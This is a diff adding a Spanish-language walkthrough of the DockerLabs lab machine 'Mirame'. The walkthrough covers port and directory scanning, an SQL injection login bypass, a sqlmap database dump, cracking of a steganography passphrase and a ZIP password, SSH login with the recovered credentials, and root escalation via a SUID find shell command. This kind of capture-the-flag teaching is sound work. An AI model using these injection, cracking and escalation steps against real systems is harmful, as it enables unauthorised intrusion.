@@ -1,0 +1,241 @@
+---
+title: Mirame
+description: Resolución completa de la máquina virtual *Mirame* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Mirame**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación y la extracción de información de la base de datos. A través de la enumeración, se descubre un directorio que contiene una imagen con datos ocultos mediante esteganografía. Tras extraer y crackear un archivo ZIP protegido, se obtienen credenciales SSH del usuario `carlos`.
+Una vez dentro, se identifica que el binario `find` tiene permisos SUID, permitiendo la escalada de privilegios a `root` mediante la técnica de GTFOBins.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Mirame',
+    Autor: 'maciiii___',
+    Dificultad: 'Fácil',
+    Fecha: '12/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Mirame.zip
+sudo bash auto_deploy.sh Mirame.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Mirame/{content,exploits,nmap,scripts}
+cd Mirame
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761544586/Ports_njxfyp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+Se encuentra únicamente `/index.php` — página principal del sitio:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1761544585/Index_suytnh.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 SQL Injection
+
+El formulario del `index.php` es vulnerable a **SQL Injection**. Se prueba un bypass de autenticación clásico:
+
+```
+Usuario: admin
+Contraseña: ' or 1=1-- -
+```
+
+Se obtiene acceso a una página de consulta meteorológica:
+
+![Page.php](https://res.cloudinary.com/dewqswzke/image/upload/v1761544586/page.php_frnzki.png)
+
+### 2.2 Extracción de datos con SQLMap
+
+Se utiliza `sqlmap` para dumpear la base de datos:
+
+```bash
+sqlmap -u "http://172.17.0.2/index.php" --forms --batch -D users -T usuarios --dump
+```
+
+![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1761544589/Users_cuunjr.png)
+
+### 2.3 Esteganografía en imagen
+
+Se descubre un directorio "travieso" que contiene una imagen llamada `miramebien.jpg`:
+
+![Directorio travieso](https://res.cloudinary.com/dewqswzke/image/upload/v1761544585/Directoriotravieso_na8ulr.png)
+
+Se analiza la imagen:
+- `exiftool` — sin resultados útiles.
+- `steghide` — presencia de datos ocultos pero requiere contraseña.
+
+![Steghide error](https://res.cloudinary.com/dewqswzke/image/upload/v1761544587/SteghideError_wfhg8c.png)
+
+Se utiliza `stegseek` para crackear la contraseña:
+
+```bash
+stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
+```
+
+![Stegseek](https://res.cloudinary.com/dewqswzke/image/upload/v1761544588/Stegseek_hpvtbe.png)
+
+Se extrae el archivo `ocultito.zip`.
+
+### 2.4 Crackeo del ZIP
+
+El archivo ZIP está protegido. Se genera su hash y se rompe con John the Ripper:
+
+```bash
+zip2john ocultito.zip > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1761544586/John_bs6z7m.png)
+
+Se descomprime el ZIP y se obtienen credenciales:
+
+```
+carlos:carlitos
+```
+
+### 2.5 Acceso SSH
+
+Se accede al sistema vía SSH:
+
+```bash
+ssh carlos@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1761544587/Ssh_mxxsxq.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De carlos → root
+
+Se buscan binarios con permisos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1761544585/Find_bhairr.png)
+
+Se identifica que `/usr/bin/find` tiene permisos SUID.
+
+Se utiliza `searchbins` para verificar la técnica en GTFOBins:
+
+```bash
+searchbins -b find -f suid
+```
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+find . -exec /bin/sh -p \; -quit
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761544588/Sudo_sf8v8l.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de login",
+      severity: "Crítica",
+      impact: "Bypass de autenticación y extracción de datos"
+    },
+    {
+      vulnerability: "Exposición de directorio con archivos sensibles",
+      severity: "Media",
+      impact: "Revelación de información y archivos con datos ocultos"
+    },
+    {
+      vulnerability: "Uso de esteganografía para ocultar credenciales sin cifrado adecuado",
+      severity: "Media",
+      impact: "Exposición de credenciales tras crackeo de contraseña"
+    },
+    {
+      vulnerability: "Contraseña débil en archivo ZIP",
+      severity: "Media",
+      impact: "Extracción de credenciales mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Permiso SUID en binario find",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
